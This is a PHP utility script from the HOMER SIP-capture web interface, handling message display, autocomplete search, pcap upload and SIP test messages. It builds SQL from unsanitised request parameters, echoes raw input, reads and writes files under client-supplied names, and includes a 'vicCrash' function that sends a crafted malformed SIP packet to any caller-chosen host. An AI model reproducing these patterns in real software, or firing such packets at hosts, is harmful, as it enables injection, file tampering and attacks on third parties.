<?php
/*
 * HOMER Web Interface
 * Homer's Utils Box
 *  
 * Copyright (C) 2011-2012 Alexandr Dubovikov <alexandr.dubovikov@gmail.com>
 * Copyright (C) 2011-2012 Lorenzo Mangani <lorenzo.mangani@gmail.com>
 *
 * The Initial Developers of the Original Code are
 *
 * Alexandr Dubovikov <alexandr.dubovikov@gmail.com>
 * Lorenzo Mangani <lorenzo.mangani@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
*/

define('_HOMEREXEC', "1");

/* MAIN CLASS modules */
include("class/index.php");

$task =  getVar('task', 'search', $_REQUEST, 'string');

switch ($task) {

        case 'sipmessage':
                sipMessage();
                break;

        case 'test':
                doTest();
                break;

	case 'livesearch':
                liveSearch();
                break;

	case 'saveit':
                SaveCflow();
                break;

        case 'sipsend':
                phpSip();
                break;

        case 'sipVic':
                vicCrash();
                break;

        case 'pcapin':
                LoadPcap();
                break;

	case 'reconfig':
                // reConf();
                break;
}

function doTest() { 

	$var = getVar('var', NULL, $_REQUEST, 'string');
	echo "OK";
	echo $var; 

}

function sipMessage() {

	$id = getVar('id', 0, $_REQUEST, 'int');
	$popuptype = getVar('popuptype', 1, $_REQUEST, 'int');
  $tnode = getVar('tnode', 0, $_REQUEST, 'int');
  $tablename = getVar('tablename', 0, $_REQUEST, 'string');
  
	global $mynodes, $db;

        $protos = array("UDP","TCP","TLS","SCTP");
        $family = array("IPv4", "IPv6");
        $types = array("REQUEST", "RESPONSE");
 
        //Crop Search Parameters, if any
        $flow_from_date = getVar('from_date', NULL, $_REQUEST, 'string');
        $flow_from_time =  getVar('from_time', NULL, $_REQUEST, 'string');
 
        if (isset($flow_from_date, $flow_from_time))
        {
          $ft = date("Y-m-d H:i:s", strtotime($flow_from_date." ".$flow_from_time));
          $where = "(`date` = '$ft') AND ";
        }

        $option = array(); //prevent problems

        if($db->dbconnect_homer(isset($mynodes[$tnode]) ? $mynodes[$tnode] : NULL)) {
        
                $query = "SELECT * "
                        ."\n FROM ".$tablename
                        ."\n WHERE ".$where." id=$id limit 1";

                $rows = $db->loadObjectList($query);
        }

        // HTML_adminhomer::displayMessage(&$rows);

        // bypass index.php and parse message body here

        if (count($rows) == 0)
        	exit;
	      $row = $rows[0];
	      $msgbody = $row->msg;
        $msgbody = preg_replace('/</', "&lt;", $msgbody);
        $msgbody = preg_replace('/>/', "&#62;", $msgbody);
        $msgbody = preg_replace('/\n/', "\n<BR>", $msgbody);
        $msgbody = preg_replace('!\\\015\\\012!',"\n<BR>",$msgbody);
        $msgbody = preg_replace('/'.$row->method.'/', "<font color='red'><b>$row->method</b></font>", $msgbody);
        $msgbody = preg_replace('/'.$row->via_1_branch.'/', "<font color='green'><b>$row->via_1_branch</b></font>", $msgbody);
        $msgbody = preg_replace('/'.$row->callid.'/', "<font color='blue'><b>$row->callid</b></font>", $msgbody);
        $msgbody = preg_replace('/'.$row->from_tag.'/', "<font color='red'><b>$row->from_tag</b></font>", $msgbody);
        $msgbody = "<br><font size=-2>".$msgbody."</font>";
        unset($row->msg);

	$winid = rand(1111, 9999)."pop";
?>

<?php if($popuptype == 2): ?>
<link href="styles/core_styles.css" rel="stylesheet" type="text/css" />
<link href="styles/form.css" rel="stylesheet" type="text/css" />
<link type="text/css" href="styles/jquery-ui-1.8.4.custom.css" rel="stylesheet" />
<script src="js/jquery-1.6.4.min.js" type="text/javascript"></script>
<script type="text/javascript" src="js/jquery-ui-1.8.16.custom.min.js"></script>
<?php endif; ?>

<script type="text/javascript">
$(document).ready(function() {
  // var mytitle = $(this).find('span.ui-dialog-title').text();
  $('#sipdetails<?php echo $winid; ?>').hide();
  $('input:button').button;
  $(this).parent().height('auto');
  // $(this).find('span.ui-dialog-title').append( $(this).find('#xbuttons') );
  return false;
});
</script>
<title>Message <?php echo $id;?></title>
<div style="margin-left: 15px">
<p>
    <input type="button" value="+/- Message" onclick="$('#sipmsg<?php echo $winid; ?>').toggle(400);"  style="background: transparent;" class="ui-button ui-widget ui-state-default ui-corner-all"/>
    <input type="button" value="+/- Details" onclick="$('#sipdetails<?php echo $winid; ?>').toggle(400);"  style="opacity: 1; background: transparent;" class="ui-button ui-widget ui-state-default ui-corner-all"/>
</p>
<div id="sipdetails<?php echo $winid; ?>" style="display: none;">
             <table border="0" cellspacing="2" cellpadding="2"  class="bodystyle">
<?php
                        foreach ($row as $key=>$value) {

                                $value = preg_replace('/</', "&lt;", $value);
                                $value = preg_replace('/>/', "&#62;", $value);
                                if($value == "") continue;
                                $value = preg_replace('/\n/', "\n<BR>", $value);
                                if($key == "proto") $value=$protos[($value-1)];
                                else if($key == "family") $value=$family[($value-2)];
                                else if($key == "type") $value=$types[($value-1)];
                                else if(preg_match("/_port/i", $key) && $value==0) continue; //Skip 0 port
?>
                        <tr >
                            <td align="right" class="dataTableContentBB"><b><?php echo $key;?></b></td>
                            <td align="left" class="dataTableContentBB"><font color="#000"><b><?php echo $value;?></b></font></td>
                         </tr>
<?php
                        }
?>
             </table>
</div>
<div id='sipmsg<?php echo $winid; ?>'>
        <?php echo $msgbody;?>
</div>
</div>
<?php
}

function liveSearch() {

  if (AUTOCOMPLETE != 0) {

        $searchterm = getVar('term', NULL, $_REQUEST, 'string');
        $searchfield = getVar('field', NULL, $_REQUEST, 'string');
        $tnode = getVar('tnode', 1, $_REQUEST, 'int');
        // timedate limit
        $search['date'] = $timeparam->date = getVar('date', '', $_REQUEST, 'string');
        $search['from_date'] = $timeparam->from_date = getVar('from_date', '', $_REQUEST, 'string');
        $search['to_date'] = $timeparam->to_date = getVar('to_date', '', $_REQUEST, 'string');
        $search['from_time'] = $timeparam->from_time = getVar('from_time', NULL, $_REQUEST, 'string');
        $search['to_time'] = $timeparam->to_time = getVar('to_time', NULL, $_REQUEST, 'string');

        $ft = date("Y-m-d H:i:s", strtotime($timeparam->from_date." ".$timeparam->from_time));
        $tt = date("Y-m-d H:i:s", strtotime($timeparam->to_date." ".$timeparam->to_time));
	//        $fhour = date("H", strtotime($timeparam->date." ".$timeparam->from_time));
	//        $thour = date("H", strtotime($timeparam->date." ".$timeparam->to_time));
	//        $j=$thour+1;

        $where = "(`date` >= '$ft' AND `date` <= '$tt' )";

	if ($searchterm == NULL) {exit;}
	if ($searchfield == NULL) {$searchfield = 'from_user';}

	$return_arr = array();

        global $mynodes, $db;

        $option = array(); //prevent problems
        $all_rows = array();
      
        if($db->dbconnect_homer(isset($mynodes[$tnode]) ? $mynodes[$tnode] : NULL)) {
			foreach ($mynodes[$tnode]->dbtables as $tablename){
                $query = "SELECT distinct ".$searchfield
                        ."\n FROM ".$tablename
                        ."\n WHERE ".$searchfield." like '%".$searchterm."%' and ".$where." limit 5";
				
                $rows = $db->loadObjectArray($query);                             
                $all_rows = array_merge($all_rows, $rows);
               }             
                
        }
        
        //unique results
		$all_rows = array_unique($all_rows);
        
	// DEBUG
	//print_r($rows);

	foreach($all_rows as $row) {
		$result = $row[$searchfield];
		if ( substr( $result, 0, 1 ) == "+" ) { $result = substr( $result, 1 ); }
		array_push($return_arr, $result);
	}

	echo json_encode($return_arr);

   }
}

function SaveCflow() {

	if ($_REQUEST['cflow'] != "") { 
	header("Content-type: application/x-cflow-png");
	header("Content-Disposition: attachment; filename=HOMER_CFLOW_".$_REQUEST['cflow']);
	readfile(PCAPDIR.$_REQUEST['cflow']);
	}

}

function LoadPcap() {
	$fn = (isset($_SERVER['HTTP_X_FILENAME']) ? $_SERVER['HTTP_X_FILENAME'] : false);
	if ($fn) {
		// AJAX call
		file_put_contents(PCAPDIR . $fn, file_get_contents('php://input') ); 
	} else {
		// FORM submit
		if (! $_FILES['file']) { 
			// show upload form if empty request
			?>
			<div id="pcapout">
			<form id="pcapup"  target="FileUpload" action="utils.php?task=pcapin" method="post" enctype="multipart/form-data">
			<input type="file" name="file" id="file" /> <br>

			<?php
				// optional HEP2 switch for captagent 0.8
				if (!defined('PCAP_AGENT4') && PCAP_AGENT != '') 
					{
					echo '<input type="checkbox" name="HEP2" id="HEP2" value="1"> Preserve Timestamps';
				   	}
			?>

			<br /><br />
			<input type="submit" name="submit" value="Start Upload" onclick="$('#FileUpload').show();" /> <img src="images/pcap.png" align="middle" style="margin: -6 2 0 0;"> 
			</form>
			</div>
			<iframe id="FileUpload" name="FileUpload" src="" style="font-size: 6pt; border: none; background: transparent; display: none; height: 50px; width: auto;"></iframe>
			<?php 
			exit;
		} else {
			echo "<font size='-1'>"; 
			if ($_FILES["file"]["error"] > 0) {
		 		echo "Error: " . $_FILES["file"]["error"] . "<br />"; 
			} else {
			        $pcapin = PCAPDIR . $_FILES["file"]["name"];
				if(isset($_POST['HEP2']) &&
   					$_POST['HEP2'] == '1')
					{ $hepv = " -H 2 -i 101"; } else { $hepv = ""; }
				$fext = substr($pcapin, strripos($pcapin, '.'));
				if ($fext != '.pcap') {echo $fext." != .PCAP"; exit;}
				move_uploaded_file($_FILES["file"]["tmp_name"], $pcapin );
				if (!file_exists($pcapin)) { echo "File Horror!"; } else {
				   if (defined('PCAP_AGENT')) { // old captagent 0.8
					exec(PCAP_AGENT.' -P /tmp/captagent_in.pid -s '.PCAP_HEP_IP.' -p '.PCAP_HEP_PORT.' -D '.$pcapin.' '.$hepv, $result, $status);
		                        if ($status != 0) { echo "Agent Not Available. Install captagent";
		                        } else { 
						if ($result[0]!='') { echo $result[0]; } else {
						echo "PCAP streamed to ".PCAP_HEP_IP.":".PCAP_HEP_PORT; 
						if ($hepv != "") { echo "<br>PCAP Time Preserved"; }
						}
					}
				   } else if (defined('PCAP_AGENT4')) { // new captagent 4
					exec(PCAP_AGENT4.' -D '.$pcapin, $result, $status);
		                        if ($status != 0) { echo "CaptAgent v4 Not Available or Misconfigured.";
		                        } else { 
						if ($result[0]!='') { echo $result[0]; } else {
						echo "PCAP streamed to ".PCAP_HEP_IP.":".PCAP_HEP_PORT; 
						if ($hepv != "") { echo "<br>PCAP Time Preserved"; }
						}
					}

				   }
				}
			} 
			echo "</font>";
		}
	}

}

function vicCrash() {

	$dhost = getVar('dest', NULL, $_REQUEST, 'string');
        $dport = getVar('port', NULL, $_REQUEST, 'string');

	echo "Re-Attacking: $dhost:$dport ... ";

	$msg = 	'SIP/2.0 200 OK'."\r\n".
	        'Via: SIP/2.0/UDP 8.7.6.5:5061;branch=z9hG4bK-573841574;rport'."\r\n\r\n".
		'Content-length: 0'."\r\n".
		'From: "100"<sip:100@localhost>; tag=683a653a7901746865726501627965'."\r\n".
		'User-agent: FU-Box 2.4'."\r\n".
		'To: "100"<sip:100@localhost>'."\r\n".
		'Cseq: 1 REGISTER'."\r\n". 
		'Call-id: 469585712'."\r\n".
		'Max-forwards: 70'."\r\n\r\n";

        $socket  = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
//        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => $timeout, 'usec' => 0));
       
        socket_connect($socket, $dhost, $dport);
 
        socket_send($socket, $msg, strLen($msg), 0);
       
        $buf = "";
        $from = "";
        $port = 0;
       
//        @socket_recvfrom($socket , $buf , 24 , 0 , $from , $port );
        socket_close($socket);
       
//        return $buf;
	echo "Done!";
}

function phpSip() {
        require_once('php-sip/PhpSIP.class.php');
        $phpsip_to = getVar('to', NULL, $_REQUEST, 'string');
        $phpsip_from = getVar('from', NULL, $_REQUEST, 'string');
        $phpsip_prox = getVar('proxy', NULL, $_REQUEST, 'string');
        $phpsip_meth = getVar('method', NULL, $_REQUEST, 'string');
        $phpsip_head = getVar('head', NULL, $_REQUEST, 'string');
        echo "FROM: ".$phpsip_from."<br>TO: ".$phpsip_to."<br>VIA ".$phpsip_prox."<br>METHOD: ".$phpsip_meth
	."<br>HEAD: ".$phpsip_head."<br>";
        echo "<br>";
        /* Sends test message */
        try
        {
          $api = new PhpSIP();
          $api->setProxy(''.$phpsip_prox);
          $api->addHeader('X-Capture: '.$phpsip_head);
          $api->setMethod(''.$phpsip_meth);
          $api->setFrom("sip:".$phpsip_from);
          $api->setUri("sip:".$phpsip_to);
          $api->setUserAgent('HOMER/Php-Sip');
          $res = $api->send();

          echo "SIP response: $res\n";

        } catch (Exception $e) {

          echo $e;
        }
}

function reConf() {

	$var_from = getVar('from', NULL, $_REQUEST, 'string');
	$var_to = getVar('to', NULL, $_REQUEST, 'string');
	$cfile = "configuration.php";
	if (isset($var_from)) {
	$file = @file_get_contents($cfile);
	if($file) {
	    if (strstr($file,$var_from)) {
	    $file = str_replace($var_from, $var_to, $file);
	    	//print $file;
		file_put_contents($cfile,$file);
		} else { echo "string not found"; }
	} else { echo "no file"; }
	} else { echo "no vars"; }

}


?>
